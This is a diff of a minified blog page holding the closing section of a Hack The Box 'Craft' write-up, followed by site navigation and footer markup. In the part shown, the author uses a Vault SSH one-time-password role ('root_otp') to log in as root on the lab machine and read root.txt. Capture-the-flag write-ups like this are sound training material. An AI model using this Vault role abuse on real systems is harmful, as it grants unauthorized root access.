 Common commands:
@@ -614,8 +317,7 @@ Usage: vault ssh [options] username@ip [ssh options]
           user@example.com
 
   For the full list of options and arguments, please see the documentation.
-</code></pre><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
+</code></pre><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p><pre><code class=language-console data-lang=console>gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
 Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
 below. Enter this code in the SSH password prompt. If you install sshpass,
 Vault can automatically perform this step for you.
@@ -652,88 +354,7 @@ root@craft:~# wc -c root.txt
 33 root.txt
 root@craft:~# 
 </code></pre><p>And we own root!!
-Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596">@Fugl</a> for pointing me in the right direction.</p>
-<p>Thanks a lot for reading, and until the next write-up.</p>
-
-    </div>
-    
-      
-        <div class="pagination">
-          <div class="pagination__title">
-            <span class="pagination__title-h">Read other posts</span>
-            <hr />
-          </div>
-          <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="https://ceso.github.io/es/posts/2020/01/hack-the-box-bitlab/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">Hack The Box - Bitlab</span>
-                </a>
-              </span>
-            
-            
-          </div>
-        </div>
-      
-    
-
-    <script src="https://utteranc.es/client.js"
-        repo="ceso/blog-source"
-        issue-term="title"
-        label="comments :speech_balloon:"
-        theme="github-dark"
-        crossorigin="anonymous"
-        async>
-</script>
-
-    
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-
-<a href="javascript:" id="return-to-top"><i class="icon-chevron-up"></i></a>
-
-
-<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
-
-
-
-  </div>
-
-            </div>
-
-            
-                <footer class="footer">
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>&copy; 2020</span>
-            
-            <span></span>
-            <span> <a href="https://ceso.github.io/" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
-        </div>
-    </div>
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Theme made by <a href="https://github.com/rhazdon">rhazdon</a></span>
-        </div>
-    </div>
-</footer>
-
-            
-        </div>
-
-        
-
-
-
-
-<script type="text/javascript" src="https://ceso.github.io/bundle.min.4a69500057d68129e88f497d354afe68422eb56de6d15e45dbe2190858ea5a76bfcb096406f992984b241db45f47388ac57ab0376e3b32125bef7a8a6d0f06c4.js" integrity="sha512-SmlQAFfWgSnoj0l9NUr&#43;aEIutW3m0V5F2&#43;IZCFjqWna/ywlkBvmSmEskHbRfRziKxXqwN247MhJb73qKbQ8GxA=="></script>
-
-
-    
-        <script src="https://ceso.github.io/js/scroll.js"></script>
-    
-
-
-    </body>
-</html>
+Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href=https://www.hackthebox.eu/profile/103596>@Fugl</a> for pointing me in the right direction.</p><p>Thanks a lot for reading, and until the next write-up.</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://ceso.github.io/es/posts/2020/01/hack-the-box-bitlab/><span class=button__icon>←</span>
+<span class=button__text>Hack The Box - Bitlab</span></a></span></div></div><script src=https://utteranc.es/client.js repo=ceso/blog-source issue-term=title label="comments :speech_balloon:" theme=github-dark crossorigin=anonymous async></script><script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><a href=javascript: id=return-to-top><i class=icon-chevron-up></i></a><link href=//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css rel=stylesheet></div></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2020</span>
+<span></span><span><a href=https://ceso.github.io/ target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Theme made by <a href=https://github.com/rhazdon>rhazdon</a></span></div></div></footer></div><script type=text/javascript src=https://ceso.github.io/bundle.min.4a69500057d68129e88f497d354afe68422eb56de6d15e45dbe2190858ea5a76bfcb096406f992984b241db45f47388ac57ab0376e3b32125bef7a8a6d0f06c4.js integrity="sha512-SmlQAFfWgSnoj0l9NUr+aEIutW3m0V5F2+IZCFjqWna/ywlkBvmSmEskHbRfRziKxXqwN247MhJb73qKbQ8GxA=="></script><script src=https://ceso.github.io/js/scroll.js></script></body></html>
